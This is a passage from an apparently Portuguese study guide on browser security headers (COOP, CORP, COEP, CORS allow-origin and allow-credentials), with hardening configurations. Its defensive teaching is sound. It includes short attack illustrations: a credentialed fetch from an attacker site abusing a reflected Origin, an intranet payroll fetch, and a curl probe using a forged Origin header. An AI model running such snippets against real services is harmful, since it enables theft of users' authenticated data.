- Se uma página maliciosa abrir sua aplicação via `window.open()`, ela manterá uma referência ao objeto `Window` da sua aplicação, podendo realizar ataques de **XS-Leaks** (contagem de frames, detecção de estado de autenticação via redirecionamentos, medição de tempo de abertura) e compartilhar o grupo de contexto de navegação.
- A propriedade `self.crossOriginIsolated` permanecerá `false`, bloqueando o uso de `SharedArrayBuffer`.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Quebra de fluxos de Login OAuth / Pagamento via Pop-up**: Se a aplicação usa `COOP: same-origin` e abre um pop-up de login em `https://auth-externo.test` esperando que o pop-up envie o token de volta via `window.opener.postMessage(...)` ou feche a janela verificando `popup.closed`, o fluxo falhará porque `window.opener` será `null` entre as duas origens. Nesse caso, deve-se usar `same-origin-allow-popups` ou migrar o fluxo OAuth de pop-up para redirecionamento de página inteira.

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, selecione o documento HTML principal e confira em **Response Headers** a presença de `cross-origin-opener-policy`.
2. Na aba **[Application](./02b-devtools-application.md#s2-2)** -> seção **Frames** -> clique no frame `top`: na seção **Security & Isolation**, o DevTools exibe explicitamente a linha **Cross-Origin Opener Policy** com o valor ativo.

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name banco.exemplo.test;

    add_header Cross-Origin-Opener-Policy "same-origin" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName banco.exemplo.test

    Header always set Cross-Origin-Opener-Policy "same-origin"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Configura Cross-Origin-Opener-Policy: same-origin (padrão no Helmet moderno)
app.use(
  helmet.crossOriginOpenerPolicy({
    policy: 'same-origin' // ou 'same-origin-allow-popups'
  })
);
```

---

<a id="s5-8"></a>
### 5.8 Cross-Origin-Resource-Policy (CORP)

##### 1. O que faz
O cabeçalho **`Cross-Origin-Resource-Policy` (CORP)** — Política de Recursos de Origem Cruzada, padronizado no **Fetch Standard** do **WHATWG** — permite que um servidor proteja qualquer recurso individual (uma imagem, um script, um vídeo, uma fonte ou um endpoint de API) declarando **quais origens têm permissão para carregar ou incorporar (`no-cors` / `<iframe>` / `<img>` / `<script>`) aquele recurso**.

Para entender a importância do CORP na prova, lembre-se de uma regra essencial da **Same-Origin Policy (SOP)** (veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)): por padrão, a SOP bloqueia a *leitura* de respostas cross-origin via `fetch()`/`XHR`, mas **permite a incorporação (*embedding*)** cross-origin! Isto é, qualquer site `https://atacante.test` pode colocar em seu HTML:
- `<img src="https://banco.exemplo.test/api/grafico-saldo.png">`
- `<script src="https://banco.exemplo.test/static/dados-usuario.js"></script>`

Quando o navegador carrega essa imagem ou script para renderizar na página do atacante (e os cookies tiverem `SameSite=None` ou for uma navegação antiga), os bytes da resposta entram no processo de memória do site do atacante, tornando-os vulneráveis a ataques de leitura de memória da CPU (**Spectre**) ou vazamentos de estado (**XS-Leaks**, como detectar se uma imagem privada carregou usando os eventos `onload` vs. `onerror` da tag `<img>`).

O cabeçalho **CORP** bloqueia essa incorporação na raiz, antes mesmo que os bytes sejam entregues ao processo renderizador. Seus 3 valores possíveis são:

- **`same-origin`**: Apenas requisições provenientes exatamente da **mesma origem** (`esquema + host + porta`) podem carregar o recurso. Qualquer tentativa de carregar o recurso a partir de outro subdomínio ou de outro site via `<img>`, `<script>`, `<link>` ou `fetch` (sem CORS válido) será bloqueada pelo navegador.
- **`same-site`**: Apenas requisições provenientes do **mesmo site** (*same-site*, ou seja, mesmo esquema e mesmo domínio registrável **eTLD+1**, como `https://app.exemplo.test` carregando uma imagem de `https://cdn.exemplo.test`) podem carregar o recurso. Sites externos continuam bloqueados.
- **`cross-origin`**: Qualquer origem da internet pode carregar o recurso (útil para arquivos estáticos em CDNs públicas que precisam ser consumidos por páginas que exigem `COEP: require-corp`).

> [!NOTE]
> **Diferença entre Mesma Origem (*Same-Origin*) e Mesmo Site (*Same-Site*)**:
> Duas URLs têm a **mesma origem** somente se coincidirem em esquema, host completo e porta (`https://loja.exemplo.test:443` e `https://api.exemplo.test:443` são **cross-origin** porque os subdomínios `loja` e `api` diferem!). Porém, ambas pertencem ao **mesmo site** (*same-site*), pois compartilham o esquema `https` e o domínio registrável `exemplo.test`.

##### 2. Quando se aplica (contexto de uso)
- **[RECOMENDAÇÃO]** (`same-origin` ou `same-site`) em todos os sub-recursos privados ou autenticados (avatares privados, gráficos gerados dinamicamente, documentos PDF, scripts internos e endpoints de API) que nunca devem ser embutidos em sites de terceiros.
- **[REQUISITO]** (`cross-origin` ou `same-origin`) em sub-recursos que precisam ser carregados por documentos que ativaram `Cross-Origin-Embedder-Policy: require-corp`.

##### 3. Exemplo prático
Um servidor retorna a foto de um documento de identidade do cliente logado na rota `https://banco.exemplo.test/api/kyc/rg-frente.jpg`:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Cross-Origin-Resource-Policy: same-origin
Cache-Control: no-store
```

Se um site externo `https://atacante.test` colocar `<img src="https://banco.exemplo.test/api/kyc/rg-frente.jpg">` na tentativa de descobrir se o usuário possui cadastro (via evento `onload`) ou ler os pixels por canal lateral, o navegador bloqueia o carregamento na camada de rede e dispara imediatamente `onerror`, protegendo o recurso.

##### 4. Configuração recomendada
Para recursos internos e endpoints de API consumidos apenas pela mesma origem:
```http
Cross-Origin-Resource-Policy: same-origin
```

Para recursos compartilhados entre diferentes subdomínios da mesma empresa (ex.: `cdn.exemplo.test` servindo para `app.exemplo.test`):
```http
Cross-Origin-Resource-Policy: same-site
```

##### 5. O que acontece quando está ausente
- Imagens, mídias, folhas de estilo e scripts servidos pelo seu domínio podem ser incorporados livremente por qualquer site de terceiros via `<img>`, `<video>`, `<script>` ou `<link>` (hotlinking e exposição a *XS-Leaks* / *Spectre*).
- Caso outra página tente carregar seu recurso enquanto utiliza `Cross-Origin-Embedder-Policy: require-corp`, o navegador bloqueará o seu recurso por falta de sinalização CORP/CORS explícita.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Definir `Cross-Origin-Resource-Policy: same-origin` em uma CDN separada (`static.loja.test`)**: Quando o site principal `www.loja.test` tentar carregar as imagens de `static.loja.test`, todas as imagens quebrarão porque `www.loja.test` e `static.loja.test` são origens diferentes (*cross-origin*), embora sejam do mesmo site (*same-site*). Nesse cenário, o valor correto é `same-site`.
- **Definir `Cross-Origin-Resource-Policy: cross-origin` em endpoints privados**: Anula a proteção contra inclusão cross-origin e permite que qualquer site carregue o recurso em seu processo de memória.

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, clique no sub-recurso (imagem, script, chamada de API) e verifique os **Response Headers** em busca de `cross-origin-resource-policy`.
2. Quando o navegador bloqueia um recurso por violação de CORP, a coluna **Status** da aba Network exibe **`(blocked:CORP)`** (ou `net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin` / `NotSameSite`) e o painel de detalhes explica como corrigir o cabeçalho.

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name api.loja-ficticia.test;

    # Permite o carregamento apenas por subdomínios de *.loja-ficticia.test
    add_header Cross-Origin-Resource-Policy "same-site" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName api.loja-ficticia.test

    Header always set Cross-Origin-Resource-Policy "same-site"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Configura Cross-Origin-Resource-Policy: same-origin (padrão no Helmet)
app.use(
  helmet.crossOriginResourcePolicy({
    policy: 'same-origin' // Opções: 'same-origin', 'same-site', 'cross-origin'
  })
);
```

---

<a id="s5-9"></a>
### 5.9 Cross-Origin-Embedder-Policy (COEP)

##### 1. O que faz
O cabeçalho **`Cross-Origin-Embedder-Policy` (COEP)** — Política de Incorporação de Origem Cruzada, padronizado no **HTML Living Standard** do **WHATWG** — instrui o navegador a **impedir que um documento carregue qualquer sub-recurso de origem cruzada (`cross-origin`) que não tenha concedido permissão explícita** ao documento (seja via cabeçalho **CORP** ou via **CORS**).

**Como `COOP` + `COEP` habilitam o estado `self.crossOriginIsolated` e o `SharedArrayBuffer`**:
Em 2018, pesquisadores descobriram as vulnerabilidades de hardware **Spectre** e **Meltdown**: um código JavaScript malicioso rodando no navegador podia usar memória compartilhada (`SharedArrayBuffer`) para construir um cronômetro de altíssima precisão e ler qualquer dado que estivesse no mesmo processo de memória do navegador (como uma imagem privada ou resposta JSON carregada de outra origem).
Para mitigar o Spectre sem destruir a web:
1. Os navegadores desativaram o `SharedArrayBuffer` por padrão e reduziram a precisão de `performance.now()`.
2. Criaram o conceito de **Isolamento de Origem Cruzada (`crossOriginIsolated`)**: para que uma página volte a ter acesso ao `SharedArrayBuffer`, `WebAssembly` com múltiplas threads e `performance.now()` com precisão de microssegundos, a página precisa garantir ao navegador que **nenhum recurso de outra origem entrou em seu processo de memória sem autorização explícita**.
3. Essa garantia é obtida enviando simultaneamente no documento HTML principal:
   - **`Cross-Origin-Opener-Policy: same-origin`** (isola a janela de outras janelas *top-level*); **E**
   - **`Cross-Origin-Embedder-Policy: require-corp`** (ou `credentialless`, que garante que todos os sub-recursos e iframes internos autorizaram a incorporação ou foram carregados sem credenciais).

Quando ambos os headers estão ativos, a propriedade global JavaScript **`self.crossOriginIsolated`** passa a retornar **`true`**!

Os 3 valores do COEP são:
- **`unsafe-none`**: Valor padrão. O documento pode carregar sub-recursos cross-origin livremente sem exigir CORP ou CORS, mas `self.crossOriginIsolated` será `false`.
- **`require-corp`**: O documento **só pode carregar** recursos da mesma origem (*same-origin*) ou recursos de origem cruzada (*cross-origin*) que enviem explicitamente o header `Cross-Origin-Resource-Policy: cross-origin` (ou `same-site`, quando aplicável) **ou** que sejam requisitados em modo CORS (por exemplo, adicionando o atributo `crossorigin` na tag `<img src="..." crossorigin>` e o servidor respondendo com `Access-Control-Allow-Origin`). Se a página tiver `<iframe>`s externos, estes também precisam enviar `COEP` e `CORP`.
- **`credentialless`** (`[Varia por versão]` — suportado em Chromium e Firefox modernos): Uma alternativa muito prática ao `require-corp` que **também habilita `self.crossOriginIsolated = true`**, mas sem exigir que servidores de terceiros adicionem o cabeçalho `CORP`! Em vez de bloquear imagens/scripts cross-origin que não têm `CORP`, o navegador simplesmente os requisita no modo `no-cors` **omitindo todas as credenciais** (sem enviar cookies, sem certificados TLS de cliente e sem cabeçalhos de autenticação). Como um recurso carregado sem credenciais contém apenas dados públicos, ele não traz risco de vazamento via Spectre.

##### 2. Quando se aplica (contexto de uso)
- **[REQUISITO]** em páginas HTML e Web Workers que necessitam de `SharedArrayBuffer`, `Atomics` em memória compartilhada, WebAssembly multithread (ex.: editores de vídeo no navegador como FFmpeg.wasm, motores 3D, jogos, processamento científico), `performance.measureUserAgentSpecificMemory()` ou timers de altíssima resolução.
- **[BOA PRÁTICA]** em aplicações de alta segurança que controlam estritamente todos os seus ativos e desejam garantir isolamento de processo no navegador.

##### 3. Exemplo prático
Um editor de vídeo online em `https://estudio.exemplo.test` precisa usar `SharedArrayBuffer` e carrega uma imagem de uma CDN externa `https://cdn-externa.exemplo.test/logo.png`:

Resposta do documento HTML principal (`https://estudio.exemplo.test/`):
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

No HTML da página, a imagem externa é declarada solicitando CORS ou a CDN responde com CORP:
```html
<img src="https://cdn-externa.exemplo.test/logo.png" crossorigin="anonymous" alt="Logo">
<script>
  console.log("Isolamento Cross-Origin ativo?", self.crossOriginIsolated); // true
  const buffer = new SharedArrayBuffer(1024); // Funciona sem ReferenceError!
</script>
```

##### 4. Configuração recomendada
Se todos os sub-recursos externos suportam CORP/CORS:
```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

Se a página carrega imagens públicas de terceiros que você não controla (e que não enviam CORP), mas ainda precisa de `self.crossOriginIsolated`:
```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: credentialless
```

Assim como o CSP, o COEP também possui um cabeçalho de simulação (**`Cross-Origin-Embedder-Policy-Report-Only`**) para testar antes de bloquear em produção.

##### 5. O que acontece quando está ausente
- O documento opera como `unsafe-none`.
- Mesmo que `Cross-Origin-Opener-Policy: same-origin` esteja configurado, a ausência do COEP impede o navegador de ativar o isolamento de origem cruzada (`self.crossOriginIsolated` será `false`).
- Qualquer tentativa de instanciar `new SharedArrayBuffer(...)` lançará um erro `ReferenceError: SharedArrayBuffer is not defined` (ou falhará ao ser transmitido via `postMessage`).

##### 6. O que pode acontecer quando está configurado incorretamente
- **Ativar `COEP: require-corp` em um site com recursos de terceiros (mapas, avatares do Gravatar, imagens externas, vídeos incorporados, anúncios)**: Todos os sub-recursos e iframes de outras origens que não enviarem `Cross-Origin-Resource-Policy: cross-origin` (ou `Access-Control-Allow-Origin`) serão **imediatamente bloqueados** pelo navegador, quebrando o layout e as integrações da página.

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, verifique os **Response Headers** do documento HTML principal procurando por `cross-origin-embedder-policy`.
2. Caso algum sub-recurso externo seja bloqueado pelo COEP, sua linha na aba Network ficará vermelha com o status **`(blocked:COEP-frame-resource-needs-coep)`** ou **`net::ERR_BLOCKED_BY_RESPONSE.NotSameOriginAfterDefaultedToSameOriginByCoep`**.
3. Na aba **[Application](./02b-devtools-application.md#s2-2)** -> seção **Frames** -> clique em `top`: em **Security & Isolation**, você verá os campos **Cross-Origin Isolated** (`Yes` ou `No`), **Cross-Origin Opener Policy** e **Cross-Origin Embedder Policy**.
4. Na aba **[Console](./02c-devtools-console.md#s2-3)**, basta digitar `self.crossOriginIsolated` e pressionar `Enter` para verificar se retorna `true` ou `false`.

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name estudio.exemplo.test;

    add_header Cross-Origin-Opener-Policy "same-origin" always;
    add_header Cross-Origin-Embedder-Policy "require-corp" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName estudio.exemplo.test

    Header always set Cross-Origin-Opener-Policy "same-origin"
    Header always set Cross-Origin-Embedder-Policy "require-corp"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

app.use(helmet.crossOriginOpenerPolicy({ policy: 'same-origin' }));
app.use(
  helmet.crossOriginEmbedderPolicy({
    policy: 'require-corp' // ou 'credentialless'
  })
);
```

---

<a id="s5-10"></a>
### 5.10 Access-Control-Allow-Origin

##### 1. O que faz
O cabeçalho **`Access-Control-Allow-Origin` (ACAO)** — padronizado no **Fetch Standard** do **WHATWG** como a peça central do mecanismo de **CORS** (*Cross-Origin Resource Sharing* — Compartilhamento de Recursos de Origem Cruzada, estudado em detalhes em [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)) — informa ao navegador se o código JavaScript executado na origem solicitante (informada no cabeçalho de requisição `Origin`) tem permissão para **ler** o corpo e os cabeçalhos da resposta HTTP retornada pelo servidor.

Para compreender o aspecto de segurança deste cabeçalho, é fundamental lembrar que o CORS **não é um mecanismo que aumenta a restrição**, e sim um mecanismo de **relaxamento controlado da Same-Origin Policy (SOP)**:
- Por padrão, a SOP já protege a aplicação impedindo que o site `https://externo.test` leia respostas de `https://api.loja-ficticia.test` via `fetch()` ou `XMLHttpRequest`.
- Quando o servidor adiciona `Access-Control-Allow-Origin`, ele está **abrindo uma exceção** na SOP para autorizar aquela origem externa a ler os dados retornados.

A especificação oficial permite apenas os seguintes formatos de valor no `Access-Control-Allow-Origin`:
- **Uma única origem explícita (`https://app.loja-ficticia.test`)**: Autoriza exclusivamente o JavaScript rodando naquela exata combinação de `esquema + host + porta` a ler a resposta. **Importante**: o padrão **não** permite listar múltiplas origens separadas por vírgula ou espaço no mesmo cabeçalho (ex.: `https://a.test, https://b.test` é inválido!), nem permite curingas parciais de subdomínio (ex.: `https://*.loja.test` é inválido!). Quando o servidor precisa autorizar múltiplas origens conhecidas, ele deve ler o header `Origin` da requisição, validá-lo contra uma lista estrita (*allowlist*) no back-end e responder com a única origem validada.
- **O curinga asterisco (`*`)**: Autoriza **qualquer origem da internet** a ler a resposta, desde que a requisição tenha sido feita **sem credenciais** (`credentials: 'omit'` ou sem `Access-Control-Allow-Credentials: true`). É seguro e apropriado apenas para dados 100% públicos (como uma API pública de previsão do tempo, CEP ou arquivos de fontes/scripts em CDNs públicas).
- **`null`** (Desencorajado / Perigoso): Autoriza documentos com origem serializada como `"null"` (como `<iframe>` com atributo `sandbox` sem `allow-same-origin`, URLs `data:` e arquivos locais `file://`). Nunca deve ser permitido em rotas sensíveis, pois qualquer atacante pode criar um `<iframe sandbox="allow-scripts">` em seu site para gerar requisições com `Origin: null` e roubar os dados!

**Obrigatoriedade do cabeçalho `Vary: Origin`**:
Sempre que o servidor responder dinamicamente com um `Access-Control-Allow-Origin` diferente dependendo de quem perguntou (por exemplo, validando se `Origin` é `https://app1.loja.test` ou `https://app2.loja.test`), o servidor tem como **[REQUISITO]** enviar também o cabeçalho **`Vary: Origin`**. Sem `Vary: Origin`, um cache compartilhado (CDN ou proxy reverso) ou o próprio cache do navegador pode armazenar a resposta gerada para `https://app1.loja.test` e entregá-la para uma requisição subsequente de `https://app2.loja.test`, causando falha de CORS para usuários legítimos ou envenenamento de cache (*Web Cache Poisoning*).

##### 2. Quando se aplica (contexto de uso)
- Deve ser enviado **somente** em endpoints de API, fontes web (`@font-face`), manifestos ou ativos estáticos que realmente precisem ser consumidos via JavaScript/CORS por páginas hospedadas em **outra origem** (por exemplo, o front-end SPA em `https://app.loja-ficticia.test` consumindo o back-end em `https://api.loja-ficticia.test`).
- Se o front-end e o back-end compartilham exatamente a **mesma origem** (`https://loja-ficticia.test` e `https://loja-ficticia.test/api`), o cabeçalho `Access-Control-Allow-Origin` **não é necessário** e a **[BOA PRÁTICA]** é simplesmente não enviá-lo.

##### 3. Exemplo prático
Requisição enviada pelo front-end `https://app.loja-ficticia.test` para a API `https://api.loja-ficticia.test/v1/produtos`:

```http
GET /v1/produtos HTTP/2
Host: api.loja-ficticia.test
Origin: https://app.loja-ficticia.test
Accept: application/json
```

Resposta segura do servidor validando a origem na lista de permissões e incluindo `Vary: Origin`:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: https://app.loja-ficticia.test
Vary: Origin
```

##### 4. Configuração recomendada
1. **Para APIs privadas ou autenticadas consumidas por origens conhecidas**: Validar o header `Origin` da requisição contra uma lista fechada e exata (*allowlist*) de origens confiáveis e retornar apenas a origem correspondente acompanhada de `Vary: Origin`:
   ```http
   Access-Control-Allow-Origin: https://app.loja-ficticia.test
   Vary: Origin
   ```
2. **Para APIs 100% públicas ou fontes estáticas em CDN (sem cookies/credenciais)**:
   ```http
   Access-Control-Allow-Origin: *
   ```

##### 5. O que acontece quando está ausente
- A **Same-Origin Policy (SOP)** mantém seu comportamento padrão: requisições da mesma origem funcionam normalmente, mas qualquer tentativa de código JavaScript de **outra origem** ler a resposta via `fetch()` ou `XMLHttpRequest` será bloqueada pelo navegador (lançando um erro de CORS no Console e ocultando a resposta do script chamador).
- Do ponto de vista de segurança, a ausência de `Access-Control-Allow-Origin` é o **estado padrão mais seguro** para rotas que não deveriam ser lidas por outros domínios.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Refletir cegamente o header `Origin` da requisição (Vulnerabilidade Crítica de CORS)**: Muitos desenvolvedores, para "resolver rápido um erro de CORS", configuram o servidor para copiar qualquer valor que venha no header `Origin` da requisição diretamente para o `Access-Control-Allow-Origin` da resposta. Isso equivale a desativar a Same-Origin Policy para o mundo inteiro e, pior ainda, funciona mesmo quando combinado com `Access-Control-Allow-Credentials: true`!
- **Erros de Expressão Regular (Regex) ao validar a origem**:
  - *Falta de âncora no início ou fim*: Uma regex como `/loja-ficticia\.test$/` aceita `https://atacanteloja-ficticia.test`!
  - *Ponto não escapado*: Uma regex como `/^https:\/\/.*\.loja-ficticia.test$/` aceita `https://sub.loja-ficticiaXtest`.
- **Usar `Access-Control-Allow-Origin: *` em APIs internas de intranet ou autenticadas por IP/Header**: Se uma API corporativa interna não usa cookies, mas confia que só quem está na rede interna da empresa consegue acessá-la, e envia `Access-Control-Allow-Origin: *`, qualquer funcionário que visitar um site malicioso externo no navegador da empresa permitirá que o JavaScript do site externo faça `fetch("http://intranet.empresa.internal/api/folha-pagamento")` e leia todos os dados internos (ataque de *Cross-Origin Intranet Pivoting*).

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, filtre por **Fetch/XHR** e clique na chamada de API desejada (bem como na requisição `OPTIONS` de *preflight*, se houver).
2. Em **Request Headers**, verifique o valor de `Origin`. Em **Response Headers**, verifique `access-control-allow-origin` e `vary: Origin`.
3. Para testar rapidamente uma má configuração de reflexão de origem em ambiente autorizado de laboratório, clique com o botão direito na requisição na aba Network -> **Copy** -> **Copy as fetch (Node.js)** ou execute no terminal `curl -i -H "Origin: https://atacante.exemplo.test" https://api.loja-ficticia.test/v1/perfil`. Se a resposta retornar `Access-Control-Allow-Origin: https://atacante.exemplo.test`, o servidor está refletindo origens arbitrariamente!

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx** (usando um bloco `map` seguro com regex exata para validar uma lista fechada de origens):
```nginx
# Fora do bloco server (no contexto http): valida apenas origens exatas autorizadas
map $http_origin $cors_origin {
    default "";
    "https://loja-ficticia.test" $http_origin;
    "https://app.loja-ficticia.test" $http_origin;
}

server {
    listen 443 ssl http2;
    server_name api.loja-ficticia.test;

    location /v1/ {
        if ($cors_origin != "") {
            add_header Access-Control-Allow-Origin $cors_origin always;
            add_header Vary "Origin" always;
        }
        # ... proxy_pass para o back-end ...
    }
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName api.loja-ficticia.test

    # Verifica se o header Origin coincide exatamente com as duas origens permitidas
    SetEnvIf Origin "^https://(app\.)?loja-ficticia\.test$" CORS_ALLOWED_ORIGIN=$0

    Header always set Access-Control-Allow-Origin %{CORS_ALLOWED_ORIGIN}e env=CORS_ALLOWED_ORIGIN
    Header always merge Vary "Origin"
</VirtualHost>
```

**Express / Node.js** (utilizando o pacote oficial `cors` com lista de permissões estrita):
```javascript
const express = require('express');
const cors = require('cors');

const app = express();

const origensPermitidas = new Set([
  'https://loja-ficticia.test',
  'https://app.loja-ficticia.test'
]);

app.use(
  cors({
    origin: function (origin, callback) {
      // Permite requisições sem header Origin (ex.: chamadas server-to-server)
      // ou origens que constem exatamente no Set de origens permitidas
      if (!origin || origensPermitidas.has(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Bloqueado pela política de CORS'));
      }
    }
  })
);
```

---

<a id="s5-11"></a>
### 5.11 Access-Control-Allow-Credentials

##### 1. O que faz
O cabeçalho **`Access-Control-Allow-Credentials` (ACAC)** — padronizado no **Fetch Standard** do **WHATWG** — aceita exclusivamente o valor booleano **`true`** (em minúsculas) e informa ao navegador que o código JavaScript de uma origem cruzada autorizada está permitido a **ler a resposta de uma requisição feita com credenciais** (`credentials: 'include'` no `fetch()` ou `withCredentials = true` no `XMLHttpRequest`).

No contexto do navegador e do padrão Fetch, **credenciais** compreendem três elementos:
1. **Cookies HTTP** (enviados automaticamente pelo navegador no cabeçalho `Cookie`, desde que atendam às regras de `SameSite=None; Secure` ou mesmo site);
2. **Cabeçalhos HTTP `Authorization`**;
3. **Certificados TLS de cliente** (*Mutual TLS / mTLS*).

Como funciona a interação entre o cliente e o servidor em requisições CORS autenticadas?
- Por padrão, quando o JavaScript faz uma requisição `fetch('https://api.outro-dominio.test/dados')` para outra origem, o navegador **não envia cookies** daquele domínio (`credentials: 'same-origin'` é o padrão).
- Para que o navegador envie cookies em uma chamada `fetch()` cross-origin, o desenvolvedor front-end precisa declarar explicitamente `fetch(url, { credentials: 'include' })`.
- Porém, mesmo que o navegador envie o cookie e o servidor processe a requisição e devolva `200 OK`, **o navegador bloqueará a entrega da resposta ao JavaScript** a menos que o servidor inclua **ambos** os cabeçalhos na resposta:
  1. `Access-Control-Allow-Origin: https://origem-exata.exemplo.test` (uma origem explícita!); e
  2. `Access-Control-Allow-Credentials: true`.

**Proibição pelo navegador do par `ACAO: *` + `ACAC: true` (Pegadinha Clássica de Prova!)**:
O padrão Fetch **proíbe terminantemente** a combinação de `Access-Control-Allow-Origin: *` com `Access-Control-Allow-Credentials: true`. Se o servidor responder com esses dois cabeçalhos simultaneamente em uma requisição com `credentials: 'include'`, o navegador **rejeitará a resposta** e lançará um erro de CORS no Console:
`The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'.`

> [!CAUTION]
> **O Perigo Crítico de combinar `Access-Control-Allow-Credentials: true` com reflexão do header `Origin`**:
> Como o navegador bloqueia `ACAO: *` com `ACAC: true`, muitos desenvolvedores contornam essa trava fazendo o servidor ler qualquer `Origin` enviado na requisição e refletir esse mesmo valor em `Access-Control-Allow-Origin`, junto com `Access-Control-Allow-Credentials: true`.
> Isso cria uma **vulnerabilidade catastrófica**: se a vítima estiver logada em `https://banco.exemplo.test` e visitar o site `https://atacante.test`, o JavaScript do atacante pode fazer `fetch('https://banco.exemplo.test/api/dados-pessoais', { credentials: 'include' })`. O servidor refletirá `Access-Control-Allow-Origin: https://atacante.test` com `Access-Control-Allow-Credentials: true`, e o navegador entregará todos os dados privados da conta autenticada da vítima diretamente na mão do script do atacante!

##### 2. Quando se aplica (contexto de uso)
- Deve ser utilizado **única e exclusivamente** em endpoints de API que precisam ser consumidos a partir de outra origem confiável (ex.: `https://app.loja-ficticia.test` chamando `https://api.loja-ficticia.test`) **e** que dependem do envio de **cookies de sessão** ou certificados TLS de cliente entre essas origens.
- Se a sua API utiliza autenticação via token `Bearer` no cabeçalho `Authorization` em uma requisição CORS simples entre origens conhecidas, basta autorizar o header em `Access-Control-Allow-Headers: Authorization` e a origem em `Access-Control-Allow-Origin`, **não sendo necessário** habilitar `Access-Control-Allow-Credentials: true` a menos que `credentials: 'include'` seja usado.

##### 3. Exemplo prático
Chamada autenticada por cookie de sessão entre `https://app.loja-ficticia.test` e `https://api.loja-ficticia.test/v1/meu-carrinho`:

No JavaScript do cliente (`https://app.loja-ficticia.test`):
```javascript
fetch('https://api.loja-ficticia.test/v1/meu-carrinho', {
  method: 'GET',
  credentials: 'include'
});
```

Resposta segura do servidor (`https://api.loja-ficticia.test`):
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: https://app.loja-ficticia.test
Access-Control-Allow-Credentials: true
Vary: Origin
```

##### 4. Configuração recomendada
- **[REQUISITO]**: Só envie `Access-Control-Allow-Credentials: true` quando `Access-Control-Allow-Origin` for validado contra uma lista estrita (*allowlist*) de domínios pertencentes à própria organização e acompanhado de `Vary: Origin`.
- Caso o endpoint não utilize cookies cross-origin, **omita o cabeçalho** (nunca envie `Access-Control-Allow-Credentials: false`, pois a especificação só define o valor `true`; para desativar, basta não enviar o cabeçalho).

##### 5. O que acontece quando está ausente
- Qualquer requisição cross-origin disparada com `credentials: 'include'` (ou `xhr.withCredentials = true`) terá sua resposta **bloqueada pelo navegador**, impedindo que o JavaScript da página chamadora leia os dados retornados.
- Para recursos públicos ou APIs que não usam cookies cross-origin, a ausência deste header é o comportamento correto e seguro.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Exfiltração total de dados autenticados (Account Takeover / Data Breach)**: Quando `Access-Control-Allow-Credentials: true` é combinado com reflexão dinâmica de `Origin` sem validação rigorosa (ou com validação de regex falha, ou permitindo `Origin: null`), qualquer site malicioso visitado pelo usuário autenticado consegue ler respostas autenticadas da API (extratos, chaves de API, mensagens privadas, tokens CSRF).
- **Combinação inválida com `*`**: Enviar `Access-Control-Allow-Origin: *` junto com `Access-Control-Allow-Credentials: true` faz o navegador bloquear todas as requisições feitas com `credentials: 'include'`, quebrando a aplicação cliente.
- **Enviar `Access-Control-Allow-Credentials: false`**: O navegador rejeita qualquer valor diferente da string exata `true` (case-sensitive em muitas implementações). Para desabilitar, o cabeçalho deve ser removido da resposta.

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, selecione a chamada **Fetch/XHR** e inspecione a seção **Response Headers**.
2. Caso encontre `access-control-allow-credentials: true`, verifique imediatamente o valor de `access-control-allow-origin` logo acima dele:
   - Se for `*`, há um erro funcional de CORS (que também aparecerá na aba **[Console](./02c-devtools-console.md#s2-3)**).
   - Se for uma origem específica, teste se o servidor está validando uma *allowlist* ou se está refletindo qualquer `Origin` arbitrário (veja o item [6.1.7 na Auditoria da Aba Network](./06-checklist-e-comparativo.md#s6)).

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx** (usando a variável `$cors_origin` validada por `map` que vimos na subseção 5.10):
```nginx
server {
    listen 443 ssl http2;
    server_name api.loja-ficticia.test;

    location /v1/ {
        if ($cors_origin != "") {
            add_header Access-Control-Allow-Origin $cors_origin always;
            add_header Access-Control-Allow-Credentials "true" always;
            add_header Vary "Origin" always;
        }
    }
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName api.loja-ficticia.test

